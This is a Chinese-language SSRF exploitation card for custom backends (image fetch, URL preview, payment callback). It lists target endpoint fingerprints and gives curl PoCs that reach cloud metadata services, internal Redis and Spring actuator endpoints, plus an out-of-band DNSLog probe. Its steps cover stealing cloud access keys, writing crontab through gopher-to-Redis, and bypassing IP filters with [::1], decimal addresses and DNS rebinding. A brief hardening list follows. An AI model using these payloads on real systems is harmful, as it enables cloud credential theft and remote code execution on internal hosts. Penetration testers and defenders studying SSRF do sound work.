---
title: SSRF（图片抓取 / 回调校验 / 推广链接检测）打内网与云元数据
cve: 无（实现缺陷）
severity: high
cvss: 8.2
product: 自研后端（抓图、URL 预览、支付回调校验）
versions: 任意
ports: 80, 443
keywords: ssrf, 内网, 元数据, 169.254.169.254, redis, gopher
entry: url=http://169.254.169.254/latest/meta-data/
verified: false
sources: 公开资料整理（实现缺陷类，无 CVE）
---

## 指纹

```
/api/upload/fetch?url=       /api/common/preview?url=
/api/pay/check?notifyUrl=    /api/agent/link/check?url=
客服系统"发送图片链接"、活动"图片外链"
```

## 前置条件

- 账号（多数抓图接口只要登录）；授权环境。

## PoC

```bash
# 1) 先探外连（DNSLog）
curl -s 'https://target/api/upload/fetch?url=http://xxxx.dnslog.cn/a'

# 2) 云元数据
curl -s 'https://target/api/upload/fetch?url=http://169.254.169.254/latest/meta-data/'
curl -s 'https://target/api/upload/fetch?url=http://100.100.100.200/latest/meta-data/'

# 3) 内网探测
curl -s 'https://target/api/upload/fetch?url=http://127.0.0.1:6379/'
curl -s 'https://target/api/upload/fetch?url=http://10.0.0.5:8080/actuator/env'
```

## 利用步骤

1. 确定接口是否回显内容/只看状态/只走 DNS（三种利用深度不同）。
2. 打云元数据：阿里云 `100.100.100.200`（可能有 AK）、AWS `169.254.169.254`（IMDSv1）。
3. 内网横向：Redis 6379（`gopher://` 构造写 crontab）、内网后台（`/actuator/env` 读配置）。
4. 限制绕过：`http://127.0.0.1` → `http://[::1]`、`0.0.0.0`、`2130706433`、DNS rebinding。
5. 证据：一条回显（脱敏）+ 时间戳；不出网的目标只留 DNS 记录。

## 修复与缓解（加固）

- URL 白名单（域名 + 端口），禁内网段与链路本地；解析后校验 IP 而非只校验字符串。
- 禁用重定向跟随；出站代理统一出口；元数据服务开 IMDSv2。

## 参考

- OWASP SSRF Prevention Cheat Sheet；云厂商元数据安全指南。
